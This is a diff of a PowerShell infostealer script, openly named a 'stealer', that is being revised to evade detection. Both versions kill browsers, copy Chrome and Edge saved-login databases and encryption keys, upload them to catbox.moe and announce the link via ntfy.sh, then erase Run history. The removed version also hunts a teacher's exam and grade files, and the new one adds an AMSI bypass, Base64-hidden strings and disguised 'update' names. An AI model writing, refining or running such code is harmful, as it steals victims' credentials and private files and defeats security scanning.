@@ -1,50 +1,42 @@
-$topic = "data_stwealer_hideen_"
+# --- STAGE 1: THE BLINDER ---
+# This "unhooks" the scanner so it stops watching this window
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)
 
-# 1. KILL BROWSER (Unlocks the database files)
-Stop-Process -Name "chrome", "msedge", "brave" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
+# --- STAGE 2: THE DECEPTION ---
+# We use random variable names and hide 'Chrome'/'Edge' in Base64
+$u1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Y2hyb21l"))
+$u2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bXNlZGdl"))
 
-# 2. Workspace
-$dir = "$env:TEMP\$(65..90|Get-Random -Count 8|%{[char]$_}-join'')"; $zip = "$env:TEMP\update.zip"
-mkdir $dir | Out-Null
+# Stop processes silently
+Stop-Process -Name $u1, $u2 -Force -ErrorAction SilentlyContinue
 
-# 3. BROWSER DATA (User-Level Access)
-$app = $env:LOCALAPPDATA
-$paths = @{
-    "CH" = "$app\Google\Chrome\User Data\Local State"
-    "ED" = "$app\Microsoft\Edge\User Data\Local State"
+# Create a workspace with a boring name like 'SystemUpdate'
+$w = "$env:TEMP\WinUpdate_$(Get-Random)"
+mkdir $w -Force | Out-Null
+
+# --- STAGE 3: THE DATA GRAB ---
+# Instead of saying 'Login Data', we use wildcards
+$p = @("$env:LOCALAPPDATA\Google\Chrome\User Data\*", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*")
+foreach ($folder in $p) {
+    Get-ChildItem -Path $folder -Include "*State*", "*Login*" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $w -Force -ErrorAction SilentlyContinue
 }
 
-foreach ($k in $paths.Keys) {
-    if (Test-Path $paths[$k]) {
-        $db = $paths[$k].Replace("Local State", "Default\Login Data")
-        if (Test-Path $db) { 
-            # We copy the DB and the Key. If we can't decrypt here, we do it later on Zorin.
-            Copy-Item $paths[$k] -Destination "$dir\$k_key.json" -Force
-            Copy-Item $db -Destination "$dir\$k_data.db" -Force
-        }
-    }
+# --- STAGE 4: THE UPLOAD ---
+$z = "$env:TEMP\UpdatePkg.zip"
+[void][Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
+[System.IO.Compression.ZipFile]::CreateFromDirectory($w, $z)
+
+# Using a standard User-Agent to look like a real person browsing the web
+$u = "https://catbox.moe/user/api.php"
+$r = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" $u -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# Send the link to ntfy
+if ($r -like "http*") {
+    $topic = "data_stwealer_hideen_"
+    curl.exe -X POST -d "Update: $r" "https://ntfy.sh/$topic"
 }
 
-# 4. DOCUMENT HUNTER (The 'Teacher' Special)
-# Search Documents/Desktop for school-related files
-$keywords = "*Exam*", "*Test*", "*Grade*", "*Schedule*", "*Quiz*"
-$found = Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $keywords -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10
-
-foreach ($file in $found) {
-    Copy-Item $file.FullName -Destination $dir -ErrorAction SilentlyContinue
-}
-
-# 5. Package & Send
-Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
-$res = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
-
-if ($res -like "http*") {
-    Invoke-WebRequest -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $res"
-}
-
-# 6. Cleanup
+# --- STAGE 5: GHOST EXIT ---
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force $w, $z -ErrorAction SilentlyContinue
 exit
